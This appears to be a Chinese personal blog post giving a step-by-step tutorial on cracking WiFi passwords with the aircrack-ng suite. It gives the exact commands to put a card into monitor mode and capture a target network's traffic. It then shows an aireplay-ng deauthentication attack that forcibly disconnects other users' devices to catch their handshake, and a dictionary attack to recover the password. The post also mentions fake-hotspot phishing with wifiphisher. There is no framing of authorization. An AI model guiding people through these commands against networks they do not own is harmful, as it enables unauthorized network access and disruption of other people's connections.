---
thumbnail: https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/thumbnail/st.jpg
title: aircrack-ng破解wifi
date: 2020-5-4
author: shepherd
toc: ture
categories: [操作系统,Linux]
tags: [aircrack-ng]
---

但是使用wifiphisher的情况并没有我想象的那样强大，应该是我的操作问题吧，只是生成了一个假热点，并将用户重定向至钓鱼页面，并没有断开连接原来wifi的设备

在查找资料时碰到了这个工具包，有一个功能就是强制断开他人的wifi，挺有趣的记下笔记

<!-- more -->

使用前提，支持监听注入的网卡

## step1

使用`iwconfig`查看网卡加载情况

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/iwconfig.png)

## step2

`airmon-ng check kill`杀掉所有网络进程

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/kill-net.png)

如果杀掉后自动启动的话，建议使用`systemctl stop`杀得彻底些

## step3

`airmon-ng start wlp0s20f0u1`启动网卡监听模块

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/start-mon.png)

注意网卡名字会变成`wlp0s20f0u1mon`

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/monitor.png)

## step4

`airodump-ng wlp0s20f0u1mon`开始监听

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/net-monitor.png)

- PWR是信号强度，越小信号越强
- CH代表信道

## step5

`airodump-ng -c 6 --bssid 网络mac地址 -w filename wlp0s20f0u1mon`开始抓包

- -c，指的是信道CH
- --bssid，指的是AP mac地址
- -w，输出的文件路径

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/airodump-ng.png)

`STATION`代表的是设备mac，由几个mac就代表有几个设备

当有设备重新连接时，就会抓到握手包，放到`-w`指定的文件里，下一步介绍强制掉线

## step6

`aireplay-ng -0 0 -a AP_mac -c 设备mac wlp0s20f0u1mon`强制wifi掉线

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/aireplay-ng.png)

重连时就会抓到握手包

![](https://cdn.jsdelivr.net/gh/shepherdev/shepherdev.github.io@hexo/static/article/2020/handsnake.png)

## step7

`aircrack-ng -a2 -b AP_mac -w 字典.txt filename.cap`跑字典，爆破密码

## 参考文献

[【无线攻防】使用aircrack-ng工具破解wifi密码](https://blog.csdn.net/nuoya_1995/article/details/52402728)